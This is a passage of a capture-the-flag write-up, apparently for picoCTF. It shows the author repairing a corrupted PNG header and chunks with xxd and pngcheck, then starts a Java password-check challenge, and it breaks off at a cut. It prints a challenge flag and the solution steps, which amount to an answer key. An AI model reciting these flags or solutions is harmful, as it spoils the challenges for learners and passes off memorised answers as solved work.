</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat mystery | xxd | head
00000000: <span style="color:#bd93f9">8965</span> 4e34 0d0a b0aa <span style="color:#bd93f9">0000</span> 000d <span style="color:#bd93f9">4322</span> <span style="color:#bd93f9">4452</span>  .eN4........C<span style="color:#f1fa8c">&#34;DR
</span><span style="color:#f1fa8c">00000010: 0000 066a 0000 0447 0802 0000 007c 8bab  ...j...G.....|..
</span><span style="color:#f1fa8c">00000020: 7800 0000 0173 5247 4200 aece 1ce9 0000  x....sRGB.......
</span><span style="color:#f1fa8c">00000030: 0004 6741 4d41 0000 b18f 0bfc 6105 0000  ..gAMA......a...
</span><span style="color:#f1fa8c">00000040: 0009 7048 5973 aa00 1625 0000 1625 0149  ..pHYs...%...%.I
</span><span style="color:#f1fa8c">00000050: 5224 f0aa aaff a5ab 4445 5478 5eec bd3f  R</span>$<span style="color:#f1fa8c">......DETx^..?
</span><span style="color:#f1fa8c">00000060: 8e64 cd71 bd2d 8b20 2080 9041 8302 08d0  .d.q.-.  ..A....
</span><span style="color:#f1fa8c">00000070: f9ed 40a0 f36e 407b 9023 8f1e d720 8b3e  ..@..n@{.#... .&gt;
</span><span style="color:#f1fa8c">00000080: b7c1 0d70 0374 b503 ae41 6bf8 bea8 fbdc  ...p.t...Ak.....
</span><span style="color:#f1fa8c">00000090: 3e7d 2a22 336f de5b 55dd 3d3d f920 9188  &gt;}*&#34;</span>3o.<span style="color:#ff79c6">[</span>U.<span style="color:#ff79c6">==</span>. ..
</code></pre></td></tr></table>
</div>
</div><p>I am examining another PNG file, and find A LOT of similarities:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat flag.png | xxd | head
00000000: <span style="color:#bd93f9">8950</span> 4e47 0d0a 1a0a <span style="color:#bd93f9">0000</span> 000d <span style="color:#bd93f9">4948</span> <span style="color:#bd93f9">4452</span>  .PNG........IHDR
00000010: <span style="color:#bd93f9">0000</span> 066a <span style="color:#bd93f9">0000</span> <span style="color:#bd93f9">0447</span> <span style="color:#bd93f9">0802</span> <span style="color:#bd93f9">0000</span> 007c 8bab  ...j...G.....|..
00000020: <span style="color:#bd93f9">7800</span> <span style="color:#bd93f9">0000</span> <span style="color:#bd93f9">0173</span> <span style="color:#bd93f9">5247</span> <span style="color:#bd93f9">4200</span> aece 1ce9 <span style="color:#bd93f9">0000</span>  x....sRGB.......
00000030: <span style="color:#bd93f9">0004</span> <span style="color:#bd93f9">6741</span> 4d41 <span style="color:#bd93f9">0000</span> b18f 0bfc <span style="color:#bd93f9">6105</span> <span style="color:#bd93f9">0000</span>  ..gAMA......a...
00000040: <span style="color:#bd93f9">0009</span> <span style="color:#bd93f9">7048</span> <span style="color:#bd93f9">5973</span> <span style="color:#bd93f9">0000</span> <span style="color:#bd93f9">1625</span> <span style="color:#bd93f9">0000</span> <span style="color:#bd93f9">1625</span> <span style="color:#bd93f9">0149</span>  ..pHYs...%...%.I
00000050: <span style="color:#bd93f9">5224</span> f000 00a8 8e49 <span style="color:#bd93f9">4441</span> <span style="color:#bd93f9">5478</span> 5eec dd2d  R$.....IDATx^..-
00000060: 94dc 46da 30ec <span style="color:#bd93f9">0718</span> 0e34 0c34 0c0c dab3  ..F.0....4.4....
00000070: <span style="color:#bd93f9">3030</span> 70e1 c23d 8b0c 0d0d 0d03 <span style="color:#bd93f9">1618</span> <span style="color:#bd93f9">0606</span>  00p..<span style="color:#ff79c6">=</span>..........
00000080: 06e6 3cc8 e001 <span style="color:#bd93f9">8686</span> 666b <span style="color:#bd93f9">1868</span> e8f3 a29c  ..&lt;.....fk.h....
00000090: f37d 25d5 8fee 2aa9 66ba 67ba c73f b9ae  .<span style="color:#ff79c6">}</span>%...*.f.g..?..
</code></pre></td></tr></table>
</div>
</div><p>As per the <a href="http://www.libpng.org/pub/png/spec/1.2/PNG-Rationale.html#R.PNG-file-signature">PNG specifications - 12.12. PNG file signature</a>,
the first eight bytes of a PNG file always contain the following values:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>(hexadecimal)</td>
<td>89  50  4e  47  0d  0a  1a  0a</td>
</tr>
<tr>
<td>(ASCII C notation)</td>
<td>\211   P   N   G  \r  \n \032 \n</td>
</tr>
</tbody>
</table>
<p>A decoder may further verify that the next eight bytes contain an IHDR chunk header.
According to <a href="http://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html">PNG Structure - 3.2. Chunk layout</a>,
the Chunk structure is:</p>
<table>
<thead>
<tr>
<th></th>
<th>Length</th>
<th>Type</th>
<th>Data</th>
<th>CRC</th>
</tr>
</thead>
<tbody>
<tr>
<td>size</td>
<td>4 bytes</td>
<td>4 bytes</td>
<td>see Chunk Length</td>
<td>4 bytes</td>
</tr>
<tr>
<td>type</td>
<td>unsigned int</td>
<td>Ascii</td>
<td></td>
<td>Hex</td>
</tr>
</tbody>
</table>
<p>Let&rsquo;s verify the IHDR chunk:</p>
<table>
<thead>
<tr>
<th></th>
<th>Length</th>
<th>Type</th>
<th>Data</th>
<th>CRC</th>
</tr>
</thead>
<tbody>
<tr>
<td>we have</td>
<td>0xd (13)</td>
<td>C&quot;DR</td>
<td>0000 066a 0000 0447 0802 0000 00</td>
<td>7c 8bab 78</td>
</tr>
<tr>
<td>we should have</td>
<td>0xd (13)</td>
<td>IHDR</td>
<td>0000 066a 0000 0447 0802 0000 00</td>
<td>7c 8bab 78</td>
</tr>
</tbody>
</table>
<p>Let&rsquo;s try to patch the first line (16 bytes) of this file header:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cp mystery mystery-patched

<span style="color:#6272a4"># BEFORE seek 16 bytes at offset 0</span>
xxd -s <span style="color:#bd93f9">0</span> -l <span style="color:#bd93f9">16</span> mystery-patched
<span style="color:#6272a4">#00000000: 8965 4e34 0d0a b0aa 0000 000d 4322 4452  .eN4........C&#34;DR</span>

<span style="color:#6272a4"># PATCH</span>
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452&#34;</span> | xxd -r - mystery-patched

<span style="color:#6272a4"># AFTER show 16 bytes at offset 0</span>
xxd -s <span style="color:#bd93f9">0</span> -l <span style="color:#bd93f9">16</span> mystery-patched
<span style="color:#6272a4">#00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR</span>

<span style="color:#6272a4"># Check file</span>
file mystery-patched
<span style="color:#6272a4">#mystery-patched: PNG image data, 1642 x 1095, 8-bit/color RGB, non-interlaced</span>
</code></pre></td></tr></table>
</div>
</div><p>The file can&rsquo;t be open so there may be another corruption. We can examine the PNG is valid with a small utility:</p>
<pre><code>sudo apt install pngcheck
pngcheck mystery-patched
mystery-patched  CRC error in chunk pHYs (computed 38d82c82, expected 495224f0
</code></pre>
<p>Lets examine the pHYs header:</p>
<table>
<thead>
<tr>
<th></th>
<th>Length</th>
<th>Type</th>
<th>Data</th>
<th>CRC</th>
</tr>
</thead>
<tbody>
<tr>
<td>we have</td>
<td>0x9</td>
<td>pHYs</td>
<td>aa00 1625 0000 1625 01</td>
<td>49 5224 f0</td>
</tr>
</tbody>
</table>
<p>Either the checksum or the Data is corrupted.
According to <a href="http://www.libpng.org/pub/png/spec/1.2/PNG-Chunks.html#C.pHYs">4.2.4.2. pHYs Physical pixel dimensions</a>,
this particular chunk has this structure:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Pixels per unit, X axis: 4 bytes (unsigned integer)</td>
<td>aa00 1625</td>
</tr>
<tr>
<td>Pixels per unit, Y axis: 4 bytes (unsigned integer)</td>
<td>0000 1625</td>
</tr>
<tr>
<td>Unit specifier:          1 byte</td>
<td>0x1</td>
</tr>
</tbody>
</table>
<p>Pixels per unit on the X axis with value <code>aa001625</code> is a huge number which does not makes any sense,
it is more probable that the value should be same as for the Y axis with <code>0x1625</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># BEFORE see byte at position 0x46</span>
xxd -s 0x46 -l <span style="color:#bd93f9">1</span> mystery-patched
<span style="color:#6272a4"># 00000046: aa                                       .</span>

<span style="color:#6272a4"># PATCH</span>
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;00000046: 00&#34;</span> | xxd -r - mystery-patched

<span style="color:#6272a4"># VERIFY PATCHING</span>
xxd -s 0x46 -l <span style="color:#bd93f9">1</span> mystery-patched
<span style="color:#6272a4"># 00000046: 00</span>

<span style="color:#6272a4"># CHECKSUM VERIFICATION</span>
pngcheck -v mystery-patched
File: mystery-patched <span style="color:#ff79c6">(</span><span style="color:#bd93f9">202940</span> bytes<span style="color:#ff79c6">)</span>
  chunk IHDR at offset 0x0000c, length <span style="color:#bd93f9">13</span>
    <span style="color:#bd93f9">1642</span> x <span style="color:#bd93f9">1095</span> image, 24-bit RGB, non-interlaced
  chunk sRGB at offset 0x00025, length <span style="color:#bd93f9">1</span>
    rendering <span style="color:#8be9fd;font-style:italic">intent</span> <span style="color:#ff79c6">=</span> perceptual
  chunk gAMA at offset 0x00032, length 4: 0.45455
  chunk pHYs at offset 0x00042, length 9: 5669x5669 pixels/meter <span style="color:#ff79c6">(</span><span style="color:#bd93f9">144</span> dpi<span style="color:#ff79c6">)</span>
:  invalid chunk length <span style="color:#ff79c6">(</span>too large<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><p>No more errors on <code>pHYs</code> chunk but an issue is detected on the following chunk <code>.DET</code> which is invalid (first character is not ascii)
and does not exist in the spec; The closest that comes to mind when comparing with other PNG is <code>IDAT</code>. Let&rsquo;s examine the Chunk</p>
<table>
<thead>
<tr>
<th></th>
<th>Length</th>
<th>Type</th>
<th>Data</th>
<th>CRC</th>
</tr>
</thead>
<tbody>
<tr>
<td>we have</td>
<td>0xaaaaffa5 ()</td>
<td>.DET</td>
<td>aa00 1625 0000 1625 01</td>
<td>49 5224 f0</td>
</tr>
</tbody>
</table>
<p>We can obtain the true size of the IDAT chunk if we can find the offset of the next chunk.
The next chunk is either another <code>IDAT </code> or an <code>IEND</code> chunk of size zero,  which terminates the file:</p>
<pre tabindex="0"><code>xxd mystery-patched | grep IDAT
00000050: 5224 f000 0318 4b49 4441 5478 5eec bd3f  R$....KIDATx^..?
00010000: 6927 db59 0000 fff4 4944 4154 3697 4678  i'.Y....IDAT6.Fx
00020000: ba6b c1fa 0000 fff4 4944 4154 d5df c0b7  .k......IDAT....
00030000: 5997 d200 0000 18a0 4944 4154 bb9d f54c  Y.......IDAT...L
</code></pre><p>Because I am using grep to find IDAT chunks, I have to run the xxd command twice.
This is to avoid missing an IDAT chunk being split between two rows of the xxd output.</p>
<ul>
<li>The first xxd uses default 16 columns (see above)</li>
<li>The second uses 8 columns (see below)</li>
</ul>
<pre tabindex="0"><code>xxd -c 8 mystery-patched | grep IDAT
00010008: 4944 4154 3697 4678  IDAT6.Fx
00020008: 4944 4154 d5df c0b7  IDAT....
00030008: 4944 4154 bb9d f54c  IDAT...L
</code></pre><p>Now it becomes simpler, and we can calculate the size with <code>0xffa5 = hex(0x10004 -4 -0x5b)</code></p>
<table>
<thead>
<tr>
<th>chunk</th>
<th>field</th>
<th>offset</th>
<th>size</th>
</tr>
</thead>
<tbody>
<tr>
<td>IDAT</td>
<td>length</td>
<td>0x53</td>
<td>4</td>
</tr>
<tr>
<td>IDAT</td>
<td>Type</td>
<td>0x57</td>
<td>4</td>
</tr>
<tr>
<td>IDAT</td>
<td>Data</td>
<td>0x5b</td>
<td><code>0x10004 -4 -0x5b</code></td>
</tr>
<tr>
<td>IDAT</td>
<td>CRC</td>
<td><code>0x10004 -4</code></td>
<td>4</td>
</tr>
<tr>
<td>next IDAT</td>
<td>length</td>
<td>0x10004</td>
<td>4</td>
</tr>
</tbody>
</table>
<p>Patching type</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># Before seek 4-bytes Type at offset 0x57</span>
xxd -s 0x53 -l <span style="color:#bd93f9">8</span> mystery-patched
00000053: aaaa ffa5 ab44 <span style="color:#bd93f9">4554</span>                                .....DET

<span style="color:#6272a4"># PATCH</span>
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;00000053: 0000 ffa5 4944 4154&#34;</span> | xxd -r - mystery-patched

<span style="color:#6272a4"># After</span>
xxd -s 0x53 -l <span style="color:#bd93f9">8</span> mystery-patched
00000053: <span style="color:#bd93f9">0000</span> ffa5 <span style="color:#bd93f9">4944</span> <span style="color:#bd93f9">4154</span>                      ....IDAT

<span style="color:#6272a4"># Verify header</span>
pngcheck -v mystery-patched
File: mystery-patched <span style="color:#ff79c6">(</span><span style="color:#bd93f9">202940</span> bytes<span style="color:#ff79c6">)</span>
  chunk IHDR at offset 0x0000c, length <span style="color:#bd93f9">13</span>
    <span style="color:#bd93f9">1642</span> x <span style="color:#bd93f9">1095</span> image, 24-bit RGB, non-interlaced
  chunk sRGB at offset 0x00025, length <span style="color:#bd93f9">1</span>
    rendering <span style="color:#8be9fd;font-style:italic">intent</span> <span style="color:#ff79c6">=</span> perceptual
  chunk gAMA at offset 0x00032, length 4: 0.45455
  chunk pHYs at offset 0x00042, length 9: 5669x5669 pixels/meter <span style="color:#ff79c6">(</span><span style="color:#bd93f9">144</span> dpi<span style="color:#ff79c6">)</span>
  chunk IDAT at offset 0x00057, length <span style="color:#bd93f9">65445</span>
    zlib: deflated, 32K window, fast compression
  chunk IDAT at offset 0x10008, length <span style="color:#bd93f9">65524</span>
  chunk IDAT at offset 0x20008, length <span style="color:#bd93f9">65524</span>
  chunk IDAT at offset 0x30008, length <span style="color:#bd93f9">6304</span>
  chunk IEND at offset 0x318b4, length <span style="color:#bd93f9">0</span>
No errors detected in mystery-patched <span style="color:#ff79c6">(</span><span style="color:#bd93f9">9</span> chunks, 96.3% compression<span style="color:#ff79c6">)</span>.
</code></pre></td></tr></table>
</div>
</div><p>Et voila! now the PNG files can be opened, but it seems all black image :/</p>
<p>picoCTF{c0rrupt10n_1847995}</p>
<h2 id="vault-door-4">vault-door-4</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">boolean</span> <span style="color:#50fa7b">checkPassword</span><span style="color:#ff79c6">(</span>String password<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> passBytes <span style="color:#ff79c6">=</span> password<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getBytes</span><span style="color:#ff79c6">();</span>
        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> myBytes <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">{</span>
            106 <span style="color:#ff79c6">,</span> 85  <span style="color:#ff79c6">,</span> 53  <span style="color:#ff79c6">,</span> 116 <span style="color:#ff79c6">,</span> 95  <span style="color:#ff79c6">,</span> 52  <span style="color:#ff79c6">,</span> 95  <span style="color:#ff79c6">,</span> 98  <span style="color:#ff79c6">,</span>
            0x55<span style="color:#ff79c6">,</span> 0x6e<span style="color:#ff79c6">,</span> 0x43<span style="color:#ff79c6">,</span> 0x68<span style="color:#ff79c6">,</span> 0x5f<span style="color:#ff79c6">,</span> 0x30<span style="color:#ff79c6">,</span> 0x66<span style="color:#ff79c6">,</span> 0x5f<span style="color:#ff79c6">,</span>
            0142<span style="color:#ff79c6">,</span> 0131<span style="color:#ff79c6">,</span> 0164<span style="color:#ff79c6">,</span> 063 <span style="color:#ff79c6">,</span> 0163<span style="color:#ff79c6">,</span> 0137<span style="color:#ff79c6">,</span> 0146<span style="color:#ff79c6">,</span> 064 <span style="color:#ff79c6">,</span>
            <span style="color:#f1fa8c">&#39;a&#39;</span> <span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#39;8&#39;</span> <span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#39;c&#39;</span> <span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#39;d&#39;</span> <span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#39;8&#39;</span> <span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#39;f&#39;</span> <span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#39;7&#39;</span> <span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#39;e&#39;</span> <span style="color:#ff79c6">,</span>
        <span style="color:#ff79c6">};</span>
        <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">int</span> i<span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">;</span> i<span style="color:#ff79c6">&lt;</span>32<span style="color:#ff79c6">;</span> i<span style="color:#ff79c6">++)</span> <span style="color:#ff79c6">{</span>
            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>passBytes<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">!=</span> myBytes<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">])</span> <span style="color:#ff79c6">{</span>
                <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span><span style="color:#ff79c6">;</span>
            <span style="color:#ff79c6">}</span>
        <span style="color:#ff79c6">}</span>
        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">true</span><span style="color:#ff79c6">;</span>
    <span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>python:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
